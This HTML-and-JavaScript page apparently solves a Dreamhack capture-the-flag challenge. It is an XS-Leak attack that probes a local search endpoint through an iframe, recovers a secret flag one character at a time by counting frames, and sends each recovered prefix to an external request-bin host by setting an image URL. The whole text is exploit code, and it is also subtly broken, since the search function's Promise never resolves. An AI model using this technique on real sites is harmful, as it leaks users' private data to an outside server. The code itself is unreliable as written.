<iframe id="iframe"></iframe>
<img id="img">
<script>
    async function search(query) {
        return new Promise((resolve) => {
            const iframe = document.getElementById("iframe");
            iframe.src = "http://localhost:8000/search?query=" + query;
            iframe.onload = () => {
                try {
                    let result = iframe.contentWindow.frames.length;
                    if (result != 0) {
                        return true;
                    } else {
                        return false;
                    }
                } catch (e) {
                    return false;
                }
            };
        });
    }

    async function exploit() {
        let chars = "0123456789abcdef}";
        let secret = "DH{22d";

        while (!secret.includes("}")) {
            let found = false;
            let promises = chars.split("").map(c => 
                search(secret + c).then(result => ({char:c, success:result}))
            );
            let results = await Promise.all(promises);

            for (let rslt of results) {
                if (rslt.success) {
                    secret += rslt.char;
                    found = true;
                    img.src = `https://ijykwcv.request.dreamhack.games/${secret}`;
                    break;
                }
            }

            if (!found) {
                img.src = `https://ijykwcv.request.dreamhack.games/failed`;
                //break;
            }
        }
    }

    exploit();
</script>
